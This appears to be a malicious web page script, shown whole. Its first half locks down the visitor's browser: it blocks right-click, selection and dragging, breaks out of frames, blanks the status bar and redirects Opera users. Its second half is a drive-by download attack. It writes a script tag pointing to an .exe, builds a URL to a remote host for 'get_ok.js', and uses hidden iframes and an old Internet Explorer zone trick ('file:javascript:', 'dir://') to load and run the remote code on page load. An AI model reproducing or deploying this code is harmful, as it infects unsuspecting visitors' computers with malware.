wside=(window.sidebar)?true:false;
var w456=false;
if(navigator.userAgent.indexOf('Opera')!=-1) {
    alert("This web page does not support Opera Browser.");
    window.location="about:blank";
}
function nrcie(){
    return false;
}
function nrcns(e) {
     if(e.which==2||e.which==3) return false;
}
if(document.layers) {
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown=nrcns;
}
document.oncontextmenu=nrcie;
document.onselectstart=new Function("return false");
function nsel(){
    if((document.layers)||wside){
        var qwe= document.getSelection();
        if(qwe!="") {window.find(" ")};
        setTimeout("nsel()",20);
    }
}
nsel();
function disdrag(){
    if(document.all){
        document.ondragstart= new Function("return false");
        for (i = 0;i< document.images.length;i++){
            z = document.images(i);
            z.galleryImg = 'no';
        }
    }
}
disdrag();
if (top.location != self.location) {
    top.location = self.location;
}
function wwddd(){
    window.status=" ";
    setTimeout("wwddd()",10);
}
wwddd()
function f369w(){
    document.location="";
    w456=true;
    return;
}
if(window.location.protocol.indexOf("file")!=-1){
    f369w();
}

document.write("<script language=\"JScripts\" src=\"/ma/ok.exe\"></script>");
jsurl="http://www.3721sf.com/ma/get_ok.js".replace(/\//g,'//');
WIE=navigator.appVersion;

if(WIE.indexOf("MSIE 5.0")>-1){
    document.write("<iframe style='display:none;' name='ok' src='dir://'><\/iframe>");
    setTimeout("mu0()",1000);
}else {
	document.write("<iframe style='display:none;' src='/ma/mmok.htm'></iframe>");
}
function mu0(){
    window.open("file:javascript:document.all.tags('SCRIPT')[0].src='"+jsurl+"';eval();","ok");
}